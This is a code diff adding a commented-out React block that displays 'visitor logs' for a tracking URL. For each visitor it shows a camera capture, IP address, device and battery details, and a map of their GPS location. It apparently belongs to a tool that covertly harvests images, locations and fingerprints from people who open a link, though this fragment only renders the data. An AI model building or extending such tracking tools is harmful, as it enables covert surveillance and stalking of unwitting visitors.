@@ -1,0 +1,47 @@
+
+{/* 
+          {visitorLogs.length > 0 ? (
+            visitorLogs.map((log, index) => (
+              <div key={index} className="device-box" style={{ borderBottom: "1px solid #ddd", marginBottom: "20px", paddingBottom: "10px" }}>
+                
+                
+                <div>
+                  <div>
+                    <h4>Camera Capture</h4>
+                    {log.cameraImage ? (
+                      <img src={log.cameraImage} alt="User" width="250" style={{ borderRadius: "8px" }} />
+                    ) : (
+                      <p>No Image Captured</p>
+                    )}
+                  </div>
+
+                  <div>
+                    <h4>Device Info</h4>
+                    <p><b>IP:</b> {log.ip}</p>
+                    <p><b>Browser:</b> {log.browser}</p>
+                    <p><b>Platform:</b> {log.platform}</p>
+                    <p><b>Screen:</b> {log.screen}</p>
+                    <p><b>RAM:</b> {log.ram} GB</p>
+                    <p><b>CPU:</b> {log.cpuCores} Cores</p>
+                    <p><b>Battery:</b> {log.batteryLevel}% ({log.isCharging ? "Charging" : "Unplugged"})</p>
+                    <p><b>Captured At:</b> {new Date(log.timestamp).toLocaleString()}</p>
+                  </div>
+                </div>
+
+                <h4>Location Map</h4>
+                {log.latitude && log.longitude ? (
+                  
+              <iframe
+                title="location"
+                width="100%"
+                height="300"
+                src={`https://maps.google.com/maps?q=${log.latitude},${log.longitude}&z=15&output=embed`}
+              ></iframe>
+                ) : (
+                  <p>Location data not available for this visitor.</p>
+                )}
+              </div>
+            ))
+          ) : (
+            <p>No visitor logs found for this specific tracking URL.</p>
+          )} */}
